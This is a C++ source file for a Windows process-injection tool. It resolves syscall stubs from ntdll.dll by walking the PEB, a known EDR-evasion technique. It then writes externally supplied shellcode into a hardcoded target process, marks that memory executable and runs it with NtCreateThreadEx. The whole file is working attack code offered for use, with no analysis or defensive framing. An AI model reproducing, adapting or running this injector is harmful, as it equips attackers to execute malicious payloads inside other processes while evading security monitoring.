

#include <Windows.h>
#include <iostream>
#include <vector>
#include <tuple>

#include "Utils.h"
#include "structs.h"
#include "SC.h"

#define STATUS_SUCCESS 0
using namespace std;

vector<BYTE> sc = SC::GetSC();
int const SYSCALL_STUB_SIZE = 21;
tuple<BYTE*, DWORD> snarf = Convert::VectorToByteArray(sc);
BYTE* shellcode = get<0>(snarf);
DWORD dwShellcodeLength = get<1>(snarf);


MyNtOpenProcess _NtOpenProcess = NULL;
char OpenProcStub[SYSCALL_STUB_SIZE] = {};

MyNtAllocateVirtualMemory _NtAllocateVirtualMemory = NULL;
char AllocStub[SYSCALL_STUB_SIZE] = {};

MyNtWriteVirtualMemory _NtWriteVirtualMemory = NULL;
char WVMStub[SYSCALL_STUB_SIZE] = {};

MyNtProtectVirtualMemory _NtProtectVirtualMemory = NULL;
char ProtectStub[SYSCALL_STUB_SIZE] = {};

MyNtCreateThreadEx _NtCreateThreadEx = NULL;
char CreateThreadStub[SYSCALL_STUB_SIZE];

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetStub(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase, std::string Syscall, LPVOID stub)
{
	for (size_t i = 0; i < dwExports; i++)
	{
		PCHAR pczFunctionName = (PCHAR)((PBYTE)dllBase + pdwAddressOfNames[i]);
		PVOID pFunctionAddress = (PBYTE)dllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];

		LPCSTR functionNameResolved = (LPCSTR)pczFunctionName;
		if (std::strcmp(functionNameResolved, Syscall.c_str()) == 0)
		{
			std::memcpy(stub, (LPVOID)pFunctionAddress, SYSCALL_STUB_SIZE);


			return TRUE;

		}
	}
	return FALSE;
}

BOOL FindAllocateVirtualMemory(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtAllocateVirtualMemory = (MyNtAllocateVirtualMemory)(LPVOID)AllocStub;
	BOOL status = VirtualProtect(AllocStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtAllocateVirtualMemory", AllocStub))
		return FALSE;

	return TRUE;
}

BOOL FindOpenProc(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtOpenProcess = (MyNtOpenProcess)(LPVOID)OpenProcStub;
	BOOL status = VirtualProtect(OpenProcStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtOpenProcess", OpenProcStub))
		return FALSE;

	printf("\n");
	for (int i = 0; i < sizeof(OpenProcStub); i++)
	{
		printf("0x%x ", OpenProcStub[i]);
	}
	printf("\n");

	return TRUE;
}

BOOL FindWriteVirtualMemory(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtWriteVirtualMemory = (MyNtWriteVirtualMemory)(LPVOID)WVMStub;
	BOOL status = VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtWriteVirtualMemory", WVMStub))
		return FALSE;

	return TRUE;
}

BOOL FindProtectVirtualMemory(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtProtectVirtualMemory = (MyNtProtectVirtualMemory)(LPVOID)ProtectStub;
	BOOL status = VirtualProtect(ProtectStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtProtectVirtualMemory", ProtectStub))
		return FALSE;

	return TRUE;
}

BOOL FindCreateThread(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunctions, PWORD pwAddressOfNameOrdinales, PVOID dllBase)
{

	DWORD oldProtection;
	_NtCreateThreadEx = (MyNtCreateThreadEx)(LPVOID)CreateThreadStub;
	BOOL status = VirtualProtect(CreateThreadStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtCreateThreadEx", CreateThreadStub))
		return FALSE;

	return TRUE;
}

HANDLE CallOpenProc(DWORD pid)
{
	// variables for NtOpenProcess
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES zoa;
	InitializeObjectAttributes(&zoa, NULL, NULL, NULL, NULL, NULL);
	CLIENT_ID targetPid = { 0 };
	targetPid.UniqueProcess = (void*)pid;
	NTSTATUS success = NULL;
	success = _NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &zoa, &targetPid);
	if (success != 0)
		return NULL;

	return hProcess;
}


BOOL EstablishSyscalls()
{

	PTEB pCurrentTeb = (PTEB)__readgsqword(0x30); 	//x64 only

	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb)
		return 1;

	//*****
	LIST_ENTRY* pListEntry = pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink;
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = NULL;
	for (pListEntry; pListEntry != NULL; pListEntry = pListEntry->Flink)
	{
		pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - 0x10);
		auto name = pLdrDataEntry->BaseDllName;
		//Make sure it is ntdll
		if (_wcsnicmp(name.Buffer, L"ntdll.dll", 10) == 0)
		{
			printf("Found ntdll.dll!\n");
			break;
		}
	}



	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pLdrDataEntry->DllBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pLdrDataEntry->DllBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pLdrDataEntry->DllBase + pImageExportDirectory->AddressOfNameOrdinals);

	if (!FindOpenProc(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtOpenProcess");
		return FALSE;
	}
	if (!FindAllocateVirtualMemory(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtAllocateVirtualMemory");
		return FALSE;
	}
	if (!FindWriteVirtualMemory(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtWriteVirtualMemory");
		return FALSE;
	}
	if (!FindProtectVirtualMemory(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtProtectVirtualMemory");
		return FALSE;
	}
	if (!FindCreateThread(pImageExportDirectory->NumberOfNames, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, pLdrDataEntry->DllBase))
	{
		printf("Can't find NtCreateThreadEx");
		return FALSE;
	}


	return TRUE;

}



int main(int argc, char* argv[])
{
	HANDLE hProc = INVALID_HANDLE_VALUE;
	HANDLE hRemoteThread = INVALID_HANDLE_VALUE;
	LPVOID lpAllocationStart = nullptr;
	SIZE_T szAllocation = dwShellcodeLength;
	DWORD oldProtect;



	/*
	if (argc < 2)
	{
		printf("Enter target PID");
		return 1;

	} */

	DWORD targetPid = 14948;

	if (!EstablishSyscalls())
		return 1;

	//DWORD targetPid = std::atoi(argv[1]);

	printf("Opening target process with PID %d\n", targetPid);
	hProc = CallOpenProc(targetPid);
	if (hProc == INVALID_HANDLE_VALUE) {
		printf("Failed to open target process\n");
		return FALSE;
	}

	printf("Allocating %d bytes\n", szAllocation);
	NTSTATUS status = _NtAllocateVirtualMemory(hProc, &lpAllocationStart, 0, &szAllocation, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS)
	{
		printf("Failed to allocate memory\n");
		return FALSE;
	}

	printf("Writing shellcode to 0x%p\n", lpAllocationStart);
	status = _NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)shellcode, dwShellcodeLength, NULL);
	if (status != STATUS_SUCCESS)
	{
		printf("Failed to write to allocated memory\n");
		return FALSE;
	}

	printf("Changing memory permissions\n");
	status = _NtProtectVirtualMemory(hProc, &lpAllocationStart, &szAllocation, PAGE_EXECUTE_READ, &oldProtect);
	if (status != STATUS_SUCCESS)
	{
		printf("Unable to change memory permissions\n");
		return FALSE;
	}

	printf("Creating remote thread\n");
	status = _NtCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProc,
		(LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);


	if (hRemoteThread)
		CloseHandle(hRemoteThread);
	if (hProc)
		CloseHandle(hProc);

	if (status != STATUS_SUCCESS)
	{
		printf("CreateRemoteThread failed\n");
		return FALSE;
	}


	printf("Success!");
	return 0;
}
